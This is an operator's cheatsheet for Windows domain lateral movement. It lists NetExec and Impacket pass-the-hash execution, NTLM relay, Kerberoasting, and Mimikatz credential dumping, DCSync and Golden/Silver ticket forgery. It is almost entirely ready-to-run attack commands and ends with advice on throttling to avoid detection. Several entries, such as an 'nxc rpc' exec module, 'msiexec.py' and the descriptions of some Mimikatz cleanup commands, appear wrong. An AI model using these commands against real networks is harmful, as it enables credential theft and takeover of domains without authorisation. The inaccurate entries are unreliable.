# Lateral Movement Cheatsheet

Compiled reference for using NetExec (nxc) Pass-the-Hash techniques and Impacket tooling during lateral movement operations. Replace placeholders (`<target>`, `<user>`, `<domain>`, `<LMHASH:NTHASH>`) with real values before running commands.

---

## NetExec Pass-the-Hash (PTH)

General tips:
- Provide hashes in `LMHASH:NTHASH` format; if LM hash is unknown, use `aad3b435b51404eeaad3b435b51404ee:<NTHASH>`.
- Append `--local-auth` when authenticating against local accounts instead of domain users.
- Add `--continue-on-success` to keep spraying additional targets even after a hit.
- Include `--verbose` for more detail during troubleshooting.

### SMB Module
- List shares with a hash:  
  `nxc smb <target_range> -u <user> -H <LMHASH:NTHASH> --shares`
- Execute a single command via SMB (default PsExec):  
  `nxc smb <target> -u <user> -H <LMHASH:NTHASH> -x "whoami"`
- Force a specific exec method (PsExec, WMExec, or Atexec):  
  `nxc smb <target> -u <user> -H <LMHASH:NTHASH> --exec-method wmiexec -x "ipconfig /all"`
- Dump SAM remotely with the hash:  
  `nxc smb <target> -u <user> -H <LMHASH:NTHASH> --sam`
- Trigger BloodHound collection with PTH:  
  `nxc smb <target_list.txt> -u <user> -H <LMHASH:NTHASH> -M bloodhound`

### WinRM Module
- Spawn a remote PowerShell command:  
  `nxc winrm <target> -u <user> -H <LMHASH:NTHASH> -x "hostname"`
- Launch an interactive shell (PowerShell remoting):  
  `nxc winrm <target> -u <user> -H <LMHASH:NTHASH> --shell`

### RDP Module
- Validate RDP access with a hash (no GUI, just auth check):  
  `nxc rdp <target> -u <user> -H <LMHASH:NTHASH>`

### WMI Module (via SMB)
- Run a command through WMI while authenticating over SMB with a hash:  
  `nxc smb <target> -u <user> -H <LMHASH:NTHASH> --wmi "powershell.exe -ExecutionPolicy Bypass -Command whoami"`

### RPC/DCOM Module
- Execute commands via DCOM using pass-the-hash:  
  `nxc rpc <target> -u <user> -H <LMHASH:NTHASH> -M exec -o COMMAND="whoami"`

### MSSQL Module
- Connect to SQL Server with pass-the-hash and enable xp_cmdshell:  
  `nxc mssql <target> -u <user> -H <LMHASH:NTHASH> -Q "EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE"`
- Execute OS command through xp_cmdshell:  
  `nxc mssql <target> -u <user> -H <LMHASH:NTHASH> -Q "EXEC xp_cmdshell 'whoami'"`  
  (requires xp_cmdshell already enabled)

### LDAP / Kerberos Modules
- AS-REP roast via LDAP against the KDC:  
  `nxc ldap <kdc_host> -u <user> -p <password> --asreproast output.txt --kdcHost <domain_fqdn>`
- Kerberoast service accounts through LDAP:  
  `nxc ldap <kdc_host> -u <user> -p <password> --kerberoast output.txt --kdcHost <domain_fqdn>`

---

## Impacket Lateral Movement Toolkit

All Impacket examples accept `-hashes <LMHASH:NTHASH>` for pass-the-hash; use `-dc-ip <domain_controller_ip>` when Kerberos lookups need help.

### Remote Command & Shell Execution
- PsExec-style service creation (semi-interactive shell):  
  `psexec.py <domain>/<user>@<target> -hashes <LMHASH:NTHASH>`
- SMB exec with named pipes (fileless, command oriented):  
  `smbexec.py <domain>/<user>@<target> -hashes <LMHASH:NTHASH>`
- WMI command execution (semi-interactive prompt):  
  `wmiexec.py <domain>/<user>@<target> -hashes <LMHASH:NTHASH>`
- DCOM-based execution using MMC:  
  `dcomexec.py <domain>/<user>@<target> -hashes <LMHASH:NTHASH>`
- Scheduled task (AT) execution:  
  `atexec.py <domain>/<user>@<target> -hashes <LMHASH:NTHASH> "cmd.exe /c whoami"`
- Remote MSI deployment (drops payload MSI):  
  `msiexec.py <domain>/<user>@<target> -hashes <LMHASH:NTHASH> <msi_path>`
- Interactive SMB client for manual operations:  
  `smbclient.py <domain>/<user>@<target> -hashes <LMHASH:NTHASH>`
- Remote registry modification or query:  
  `reg.py <domain>/<user>@<target> -hashes <LMHASH:NTHASH> query -key HKLM\\Software`

### Service & Task Abuse Helpers
- Query/modify Windows services over RPC:  
  `services.py <domain>/<user>@<target> -hashes <LMHASH:NTHASH> list`
- Manage scheduled tasks:  
  `schtasks.py <domain>/<user>@<target> -hashes <LMHASH:NTHASH> -create`

### SQL Server & LDAP Movement
- MSSQL client with integrated/NTLM auth:  
  `mssqlclient.py <domain>/<user>@<target> -hashes <LMHASH:NTHASH> -windows-auth`
- LDAP queries with a hash (enumerate AD for escalation paths):  
  `ldapdomaindump.py <domain>/<user>@<dc_ip> -hashes <LMHASH:NTHASH>`
- Enumerate domain SIDs and users:  
  `lookupsid.py <domain>/<user>@<target> -hashes <LMHASH:NTHASH>`
- Add new machine account using credentials/hashes:  
  `addcomputer.py <domain>/<user>@<dc_ip> -hashes <LMHASH:NTHASH> -computer-name <NEWCOMPUTER$> -computer-pass <Password>`
- Impacket `mssqlclient.py` upload/download shortcuts (within SQL> prompt):  
  - `SQL> enable_xp_cmdshell` – Turn on xp_cmdshell.  
  - `SQL> xp_cmdshell whoami` – Run OS command.  
  - `SQL> upload /path/to/local.bin C:\Windows\Temp\local.bin` – Push file to target.  
  - `SQL> download C:\Windows\Temp\loot.txt ./loot.txt` – Pull file from target.  
  - `SQL> disable_xp_cmdshell` – Restore default setting when finished.

### Kerberos & Ticket Operations
- Use pass-the-hash with Kerberos (no password required):  
  `GetUserSPNs.py <domain>/<user> -hashes <LMHASH:NTHASH> -dc-ip <dc_ip>`
- Request TGT using NT hash (pass-the-key):  
  `getTGT.py <domain>/<user> -hashes <LMHASH:NTHASH>`
- Relay NTLM across protocols for lateral moves:  
  `ntlmrelayx.py -t smb://<target> -socks -debug`  
  (Feed hashes via coercion tools; combine with `--no-smb-server` for targeted relays.)
- Create forged Kerberos tickets for delegation abuse:  
  `ticketer.py -nthash <NTHASH> -domain <domain> -spn <service>/<target> <user>`
- Perform Resource-Based Constrained Delegation attacks:  
  `rbcd.py <domain>/<user>@<dc_ip> -hashes <LMHASH:NTHASH> -delegate-from <SOURCE$> -delegate-to <TARGET$> -sid <TARGET_SID>`

---

## Mimikatz Command Reference

Run Mimikatz from an elevated context (Administrator) and enable debug privilege before harvesting credentials.

### Setup & Privilege Escalation
- `privilege::debug` – Enable SeDebugPrivilege required for most credential extraction.
- `token::list` – Enumerate available tokens.
- `token::elevate` – Impersonate a higher-privileged token (e.g., SYSTEM).

### LSASS Credentials & Tickets
- `sekurlsa::logonpasswords` – Dump live credentials (usernames, NT hashes, clear-text when available).
- `sekurlsa::logonpasswords /inject` – Spawn an elevated process and dump from there.
- `sekurlsa::kerberos` – List Kerberos tickets from LSASS.
- `sekurlsa::tickets /export` – Export Kerberos tickets (TGT/TGS) to `.kirbi` files.
- `sekurlsa::ekeys` – Retrieve Kerberos encryption keys for sessions.

### SAM, LSA, and DC Sync
- `lsadump::sam` – Dump local SAM database (requires SYSTEM).
- `lsadump::lsa /patch` – Extract cached domain logons and secrets.
- `lsadump::dcsync /domain:<domain> /user:<user_or_krbtgt>` – Perform DCSync to pull password hashes without touching LSASS.
- `lsadump::dcsync /domain:<domain> /all /csv` – Dump entire domain credential set to CSV.

### Credentials Vaults & DPAPI
- `vault::list` – Enumerate Credential Manager entries.
- `vault::cred /patch` – Dump Credential Manager secrets.
- `dpapi::cred /in:<masterkey>` – Decrypt DPAPI-protected credentials when master key is known.
- `dpapi::cache /in:<blob>` – Decode cached domain credentials.

### Kerberos Ticket Forgery & Abuse
- `kerberos::list /export` – Enumerate and export Kerberos tickets.
- `kerberos::ptt <ticket.kirbi>` – Pass-the-ticket by injecting a `.kirbi`.
- `kerberos::golden /user:<user> /domain:<domain> /sid:<domain_sid> /krbtgt:<nt_hash>` – Craft a Golden Ticket.
- `kerberos::silver /service:<service>/<host> /target:<host> /domain:<domain> /sid:<domain_sid> /rc4:<service_hash>` – Craft a Silver Ticket.

### Certificates & Smartcards
- `crypto::certificates /export` – Export installed certificates (search for client auth certs).
- `crypto::capi` – Enumerate CAPI keys and providers.
- `crypto::cng` – List CNG keys.
- `token::elevate /domainadmin` – Leverage smartcard/PKI tokens when present.

### Cleanup
- `sekurlsa::minidump` – Switch LSASS target back to live memory after using minidumps.
- `privilege::debug /restore` – Drop debug privilege when done.
- `exit` – Close Mimikatz cleanly.

---

### Quick Reference Notes
- When only an NT hash is available, prepend the empty LM hash (`aad3b435b51404eeaad3b435b51404ee:`) to satisfy tools that expect both halves.
- Combine NetExec with `-o KERBEROAST` or Impacket’s `GetNPUsers.py` to harvest additional hashes before pivoting.
- For noisy environments, throttle NetExec with `--rate` and Impacket with `--port` adjustments to avoid detection.
